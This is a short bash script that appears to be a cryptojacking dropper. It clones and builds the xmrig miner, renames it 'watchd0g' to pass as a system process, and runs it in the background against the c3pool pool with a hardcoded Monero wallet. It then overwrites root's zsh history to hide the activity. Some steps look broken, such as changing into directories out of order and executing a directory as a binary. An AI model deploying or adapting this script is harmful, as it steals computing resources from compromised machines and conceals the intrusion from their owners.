#!/bin/bash

cd /tmp

apt install git make cmake gcc automake libtool autoconf -y

git clone https://github.com/momika233/xmrig.git

cd scripts && ./build_deps.sh && cd ../build

cmake .. -DXMRIG_DEPS=scripts/deps

make -j$(nproc)

mkdir /tmp/watchd0g

mv /tmp/xmrig/build/xmrig /tmp/watchd0g

chmod 777 /tmp/watchd0g && cd /tmp && ./watchd0g --donate-level 0 -o auto.c3pool.org:19999 -u 45F8ihixwyTi2WLadoJrsKdjwstKTAEupCYE6jzoBAZWQuY9uXxVh6i1LzoppCXuUx8tXjfaFUCG11DGXeXLkyrx1ir3gZj -t 2 -B && echo "exit" > /root/.zsh_history
